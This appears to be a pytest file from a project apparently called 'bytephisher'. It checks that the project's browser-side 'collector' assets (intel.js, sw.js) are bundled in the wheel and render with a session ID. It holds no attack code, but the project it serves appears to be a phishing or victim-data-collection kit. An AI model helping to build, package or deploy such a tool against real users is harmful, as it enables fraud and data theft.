"""Packaging: the wheel must carry what the code reads at runtime.

Found by installing the built wheel into a clean venv: `assets/` was not in it, so
`render_js()` raised `FileNotFoundError` and the collector could not be served at all for
anyone who installs the package. The cause was a declaration that looked right and did
nothing - `package-data` for `bytephisher`, which is a py-module, not a package.

These tests keep that from coming back without a 3-minute wheel build: the resolver must
find the assets, a missing one must raise with the paths it tried, and the packaging
declaration must name the package that actually holds them.
"""
import os
import sys

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import asset_path  # noqa: E402

pytestmark = pytest.mark.unit


class TestTheResolver:

    def test_the_browser_assets_are_found(self):
        for name in ("intel.js", "sw.js"):
            p = asset_path(name)
            assert os.path.isfile(p), p
            assert os.path.getsize(p) > 1000, f"{name} looks empty"

    def test_they_live_inside_the_package(self):
        """Inside the package is what makes a wheel carry them."""
        core_dir = os.path.join(HERE, "core")
        for name in ("intel.js", "sw.js"):
            assert os.path.isfile(os.path.join(core_dir, "assets", name)), name

    def test_a_missing_asset_raises_with_the_paths_it_tried(self):
        with pytest.raises(FileNotFoundError) as e:
            asset_path("definitely-not-here.js")
        msg = str(e.value)
        assert "definitely-not-here.js" in msg
        assert "core/assets" in msg, "the error must say where they are meant to live"

    def test_the_collector_renders(self):
        import core.intel as I
        js = I.render_js(asset_path("intel.js"), "a" * 32)
        assert len(js) > 10000 and "__SID__" not in js


class TestTheDeclaration:

    @staticmethod
    def _pyproject():
        try:
            import tomllib
        except ImportError:                      # python 3.10
            import tomli as tomllib  # type: ignore
        with open(os.path.join(HERE, "pyproject.toml"), "rb") as f:
            return tomllib.load(f)

    def test_package_data_targets_the_core_package(self):
        """The bug was `bytephisher = [...]`, a py-module that owns no files."""
        conf = self._pyproject()
        data = conf["tool"]["setuptools"]["package-data"]
        assert "core" in data, f"package-data must name the core package: {sorted(data)}"
        assert any("assets" in entry for entry in data["core"]), data["core"]
        assert "bytephisher" not in data, (
            "package-data for a py-module packages nothing - that was the bug")

    def test_core_is_a_declared_package(self):
        conf = self._pyproject()
        assert "core" in conf["tool"]["setuptools"]["packages"]
